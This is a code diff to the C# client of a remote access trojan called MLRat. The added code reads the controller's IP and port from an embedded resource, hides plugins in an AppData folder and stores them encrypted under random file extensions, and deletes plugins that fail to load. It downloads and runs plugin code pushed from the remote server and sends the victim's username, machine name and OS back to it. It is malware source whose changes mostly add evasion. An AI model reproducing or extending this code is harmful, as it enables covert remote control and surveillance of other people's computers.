@@ -8,6 +8,9 @@ using System.IO;
 using System.Reflection;
 using System.Threading;
 using System.Windows.Forms;
+using System.Security.Cryptography;
+using System.Resources;
+using System.Runtime.InteropServices;
 
 namespace MLRatClient
 {
@@ -15,11 +18,29 @@ namespace MLRatClient
     {
         private static eSock.Client networkClient;
         private static Dictionary<Guid, MLClientPlugin> LoadedPlugins = new Dictionary<Guid, MLClientPlugin>();
-        private static Dictionary<Guid, FileStream> PluginUpdates = new Dictionary<Guid, FileStream>();
+        private static Dictionary<Guid, Stream> PluginUpdates = new Dictionary<Guid, Stream>();
         private static string PluginBaseLocation;
+        private static string IP = "";
+        private static int Port = 0;
+
         [STAThread]
         static void Main(string[] args)
         {
+            AppDomain.CurrentDomain.AssemblyResolve +=
+            (sender, arg) =>
+            {
+                string resourceName = "MLRatClient." + new AssemblyName(arg.Name).Name + ".dll";
+
+                using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
+                {
+                    Byte[] assemblyData = new Byte[stream.Length];
+
+                    stream.Read(assemblyData, 0, assemblyData.Length);
+
+                    return Assembly.Load(assemblyData);
+
+                }
+            };
             Application.EnableVisualStyles();
             string _ratBase = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                 "MLRat");
@@ -28,14 +49,42 @@ namespace MLRatClient
             CreateHiddentDirectory(PluginBaseLocation);
 
             DirectoryInfo di = new DirectoryInfo(PluginBaseLocation);
-            foreach (FileInfo fi in di.GetFiles("*.MLP"))
+            foreach (FileInfo fi in di.GetFiles("*"))
             {
                 LoadPlugin(fi.FullName);
             }
 
             Console.WriteLine("MLRat started");
+            ReadSettings();
+            Console.WriteLine("IP: {0}", IP);
+            Console.WriteLine("Port: {0}", Port);
             Connect();
             Application.Run();
+        }
+
+        static void ReadSettings()
+        {
+            try
+            {
+                IntPtr module = GetModuleHandle(null);
+                IntPtr loc = FindResource(module, "Settings", "RT_RCDATA");
+                IntPtr resourceAddr = LoadResource(module, loc);
+                uint size = SizeofResource(module, loc);
+                byte[] resource = new byte[size];
+                Marshal.Copy(resourceAddr, resource, 0, resource.Length);
+                using (MemoryStream ms = new MemoryStream(resource))
+                using (BinaryReader br = new BinaryReader(ms))
+                {
+                    Port = br.ReadInt32();
+                    IP = br.ReadString();
+                }
+                Console.WriteLine("Loaded from settings");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.ToString());
+                Environment.Exit(0);
+            }
         }
         static void Connect()
         {
@@ -45,8 +94,7 @@ namespace MLRatClient
             networkClient.OnDataRetrieved += networkClient_OnDataRetrieved;
             networkClient.OnDisconnect += networkClient_OnDisconnect;
             networkClient.OnConnect += NetworkClient_OnConnect;
-            networkClient.ConnectAsync("127.0.0.1", 12345);
-            
+            networkClient.ConnectAsync(IP, Port);
         }
 
         private static void NetworkClient_OnConnect(eSock.Client sender, bool success)
@@ -66,7 +114,7 @@ namespace MLRatClient
                         DisplayException(_plugin, ex);
                     }
                 }
-                networkClient.Send(Guid.Empty, (byte)NetworkPacket.Handshake, string.Format("{0}/{1}", Environment.UserName, Environment.MachineName), Environment.OSVersion.ToString());
+                networkClient.Send(Guid.Empty, (byte)NetworkPacket.Handshake);
                 Console.WriteLine("handshake sent");
             }
             else
@@ -108,14 +156,66 @@ namespace MLRatClient
             MLClientPlugin _plugin = null;
             try
             {
-                byte[] PluginBytes = File.ReadAllBytes(path);
-                _plugin = new MLClientPlugin(PluginBytes);
+                byte[] PluginBytes = null;
+
+                using (FileStream fs = new FileStream(path, FileMode.Open))
+                {
+                    using (Rijndael rij = new RijndaelManaged())
+                    {
+                        
+                        string key = Path.GetExtension(path);
+                        key = key.Substring(1, key.Length - 1);
+                        byte[] encryptionKey = eSock.Hashing.MD5Hash(key);
+                        rij.Key = encryptionKey;
+                        rij.IV = encryptionKey;
+                        ICryptoTransform crypto = rij.CreateDecryptor();
+                        using (MemoryStream ms = new MemoryStream())
+                        {
+                            byte[] buffer = new byte[1000];
+                            int bytesread = 0;
+                            using (CryptoStream cs = new CryptoStream(fs, crypto, CryptoStreamMode.Read))
+                            {
+                                while ((bytesread = cs.Read(buffer, 0, buffer.Length)) > 0)
+                                {
+                                    ms.Write(buffer, 0, bytesread);
+                                }
+                                cs.Close();
+                            }
+                            PluginBytes = ms.ToArray();
+                        }
+                    }
+                }
+                    /*
+                    using (Rijndael rij = new RijndaelManaged())
+                    {
+                        byte[] encryptionKey = eSock.Hashing.MD5Hash(Path.GetExtension(path));
+                        rij.Key = encryptionKey;
+                        rij.IV = encryptionKey;
+                        ICryptoTransform crypto = rij.CreateDecryptor();
+                        byte[] encrypted = File.ReadAllBytes(path);
+
+                        using (MemoryStream ms = new MemoryStream())
+                        {
+                            using (CryptoStream cs = new CryptoStream(ms, crypto, CryptoStreamMode.Write))
+                            {
+                                cs.Write(encrypted, 0, encrypted.Length);
+                                cs.Flush();
+                                cs.Close();
+                            }
+                            PluginBytes = ms.ToArray();
+                        }
+
+                    }
+                    */
+
+                    _plugin = new MLClientPlugin(PluginBytes);
                 if (!_plugin.Load())
                     throw new Exception("Failed to load plugin");
                 if (_plugin.ClientPluginID == Guid.Empty)
                     throw new Exception("Invalid plugin ID");
                 if (LoadedPlugins.ContainsKey(_plugin.ClientPluginID))
                     throw new Exception("Client plugin ID match");
+                _plugin.Path = path;
                 LoadedPlugins.Add(_plugin.ClientPluginID, _plugin);
                 Console.WriteLine("Loaded plugin: {0}", _plugin.ClientPluginID.ToString("n"));
                 _plugin.ClientPlugin.OnPluginLoad(new MLConnection(_plugin.ClientPluginID, OnSend));
@@ -123,6 +223,7 @@ namespace MLRatClient
             }
             catch(Exception ex)
             {
+                File.Delete(path);
                 DisplayException(_plugin, ex);
             }
         }
@@ -204,8 +305,12 @@ namespace MLRatClient
                     if (command == NetworkPacket.DeletePlugin)
                     {
                         Guid PluginID = (Guid)data[2];
-                        Console.WriteLine("Deleting plugin {0}", PluginID.ToString("n"));
-                        File.Delete(Path.Combine(PluginBaseLocation, string.Format("{0}.MLP", PluginID.ToString("n"))));
+                        if(LoadedPlugins.ContainsKey(PluginID))
+                        {
+                            Console.WriteLine("Deleting plugin {0}", PluginID.ToString("n"));
+                            File.Delete(LoadedPlugins[PluginID].Path);
+                        }
+                        
                     }
 
                     if (command == NetworkPacket.UpdatePlugin)
@@ -216,20 +321,30 @@ namespace MLRatClient
 
                         if (!PluginUpdates.ContainsKey(PluginID))
                         {
-                            lock (sender)
+                            Rijndael rij = new RijndaelManaged();
+                            string encString = Guid.NewGuid().ToString("n");
+                            byte[] encryptionKey = eSock.Hashing.MD5Hash(encString);
+                            rij.Key = encryptionKey;
+                            rij.IV = encryptionKey;
+                            ICryptoTransform crypto = rij.CreateEncryptor();
+
+                            FileStream update =
+                                new FileStream(
+                                    Path.Combine(PluginBaseLocation,
+                                        string.Format("{0}.{1}", PluginID.ToString("n"), encString)), FileMode.Create);
+                            CryptoStream updateStream = new CryptoStream(update, crypto, CryptoStreamMode.Write);
+                            PluginUpdates[PluginID] = updateStream;
+                            Console.WriteLine("Started update for plugin id {0}", PluginID.ToString("n"));
+                            if (LoadedPlugins.ContainsKey(PluginID))
                             {
-                                FileStream update =
-                                    new FileStream(
-                                        Path.Combine(PluginBaseLocation,
-                                            string.Format("{0}.MLP", PluginID.ToString("n"))), FileMode.Create);
-                                PluginUpdates[PluginID] = update;
-                                Console.WriteLine("Started update for plugin id {0}", PluginID.ToString("n"));
+                                File.Delete(LoadedPlugins[PluginID].Path);
                             }
                         }
                         Console.WriteLine("Plugin block ({0} bytes) recieved. ID: {1}", Block.Length, PluginID.ToString("n"));
                         PluginUpdates[PluginID].Write(Block, 0, Block.Length);
                         if (FinalBlock)
                         {
+                            PluginUpdates[PluginID].Flush();
                             PluginUpdates[PluginID].Close();
                             PluginUpdates[PluginID].Dispose();
                             PluginUpdates.Remove(PluginID);
@@ -253,7 +368,6 @@ namespace MLRatClient
                         networkClient.Send(Guid.Empty, (byte)NetworkPacket.UpdateSetting, "Username", string.Format("{0}/{1}", Environment.UserName, Environment.MachineName));
                         networkClient.Send(Guid.Empty, (byte)NetworkPacket.UpdateSetting, "OS", Environment.OSVersion.ToString());
                         networkClient.Send(Guid.Empty, (byte)NetworkPacket.UpdateSetting, "Cores", Environment.ProcessorCount.ToString());
-                        networkClient.Send(Guid.Empty, (byte)NetworkPacket.UpdateSetting, "Path", Assembly.GetExecutingAssembly().Location);
                         networkClient.Send(Guid.Empty, (byte)NetworkPacket.BasicSettingsUpdated);
                     }
 
@@ -287,8 +401,21 @@ namespace MLRatClient
             }
         }
 
+
         #endregion
 
-        
+        #region " WinApi "
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetModuleHandle(string module);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr FindResource(IntPtr hModule, string lpName, string lpType);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr LoadResource(IntPtr hModule, IntPtr hResInfo);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern uint SizeofResource(IntPtr hModule, IntPtr hResInfo);
+
+        #endregion
+
     }
 }
